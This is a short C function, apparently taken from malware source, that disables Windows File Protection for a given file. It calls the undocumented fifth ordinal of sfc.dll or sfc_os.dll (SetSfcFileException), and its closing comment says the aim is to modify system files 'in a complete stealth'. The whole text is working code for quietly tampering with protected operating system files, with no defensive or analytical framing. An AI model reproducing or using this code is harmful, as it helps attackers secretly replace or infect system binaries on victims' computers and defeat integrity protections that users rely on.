void Disable_WFP(char *szFile)
{
	// we have to convert ASCII string to Unicode string, else this wont work
	wchar_t Path[256];
	MultiByteToWideChar(CP_ACP, 0, szFile, -1, Path, 256);

	HINSTANCE sfc_dll;
	if (GetOsVer())
	{
		// Win2K
		sfc_dll = LoadLibrary("sfc.dll");	
	}
	else
	{
		// WinXP/Win2K3(Vista???)
		sfc_dll = LoadLibrary("sfc_os.dll");
	}

	// the function is stored at the fifth ordinal in sfc_os.dll
	fSetSfcFileException = (SSFE)GetProcAddress(sfc_dll, (LPCSTR)5);
	fSetSfcFileException(0, Path, -1);

	//Now we can modify the system file in a complete stealth.
}